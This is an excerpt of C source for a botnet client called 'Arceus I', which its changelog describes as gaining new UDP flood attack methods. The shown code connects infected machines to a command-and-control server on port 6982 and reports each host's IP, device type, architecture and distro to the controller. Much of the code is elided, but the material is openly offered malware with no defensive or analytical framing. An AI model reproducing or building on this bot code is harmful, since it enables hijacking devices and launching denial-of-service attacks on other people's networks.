...
Managed Bot/Client
Added New Layer4 UDP Methods Including ["STOMP", "CRUSH"]
...
============================================
Fixed : getDistro() - Now actually obtains the distro, I have added some parenthesis and brackets which were missing.
Fixed : print_Name - Now actually outputs OS detection properly and accurately.
Fixed : ioctl(sock, SIOCGIFHWADDR, &ifr) - Now uses handle data, as format.
Fixed : if (*format == '%') goto out; - Formatting now proposes data without removing any ASCII.
*/
#include <stdlib.h>
#include <stdarg.h>
#include <stdio.h>
...
#define SERVER_LIST_SIZE (sizeof(Arceus) / sizeof(unsigned char *))
#define PAD_RIGHT 1
#define PAD_ZERO 2
...
////////////////////////////
#define Project "Arceus I - Telnet Layer / C2 Client/Bot"
#define Developer ["FlexingOnLamers", "GeorgiaCri", "transmissional"]
...
int initConnection()
{
        ...
        strcpy(server, Arceus[currentServer]);
        int port = 6982;
...
int main(int argc, unsigned char *argv[])
{
        ...
        while(1)
        {
                ...
                sockprintf(mainCommSock, "\e[38;5;93m[\e[38;5;202mArceus\e[38;5;93m] \e[38;5;202mIP:\e[38;5;93m[\e[38;5;202m%s\e[38;5;93m] \e[38;5;202mPort:\e[38;5;93m[\e[38;5;202m%s\e[38;5;93m] \e[38;5;202mDevice:\e[38;5;93m[\e[38;5;202m%s\e[38;5;93m] \e[38;5;202mType:\e[38;5;93m[\e[38;5;202m%s\e[38;5;93m] \e[38;5;202mArch:\e[38;5;93m[\e[38;5;202m%s\e[38;5;93m] \e[38;5;202mDistro:\e[38;5;93m[\e[38;5;202m%s\e[38;5;93m] \e[38;5;202mSystem:\e[38;5;93m[\e[38;5;202m%s\e[38;5;93m]", inet_ntoa(ourIP), getPortz(), getDevice(), getFiles(), getArch(), getDistro(), getSys());
                char commBuf[4096];
                int got = 0;
                int i = 0;
